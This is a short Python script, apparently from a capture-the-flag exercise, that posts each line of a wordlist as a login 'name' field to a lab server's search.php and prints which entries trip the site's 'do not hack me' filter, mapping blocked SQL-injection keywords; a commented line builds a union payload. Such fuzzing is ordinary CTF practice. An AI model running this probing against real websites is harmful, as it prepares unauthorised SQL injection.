#!/bin/python

import requests

url = "http://b46c6cfd-3537-47e5-b34b-b036224ef383.node4.buuoj.cn:81/search.php"

with open("sql.txt","r") as f:
    for line in f:
        line = line.strip()
#        payload = f"1{line}union"
        data = {"name":line,"pw":"123"}
#        res = requests.get(url,params = data)
        res = requests.post(url,data = data)
        if "do not hack me" in res.text:
            print(line,end=' ')

